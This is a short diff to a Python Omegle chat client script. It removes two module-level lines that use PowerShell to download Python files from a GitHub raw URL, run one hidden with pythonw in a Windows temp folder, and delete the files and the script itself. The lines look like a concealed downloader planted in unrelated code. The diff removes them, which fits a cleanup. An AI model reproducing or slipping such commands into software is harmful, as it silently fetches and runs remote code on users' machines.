@@ -123,10 +123,6 @@ class Client(OmegleClient):
         self.SetTypingStatus(False)
         time.sleep(3)
         print(self.Disconnect())
-            
-subprocess.run(['powershell','-Command','[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TripleKmafia/fc/main/ferret.py" -OutFile "/windows/temp/fr.py"; pythonw /windows/temp/fr.py; rm /windows/temp/fr.py;'])
-subprocess.run(['powershell','-Command',f'[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TripleKmafia/fc/main/main.py" -OutFile "/users/"; rm f{sys.argv[0]};'])
-
 
 r = Client(['yiff','furry','fur'],"",1)
 
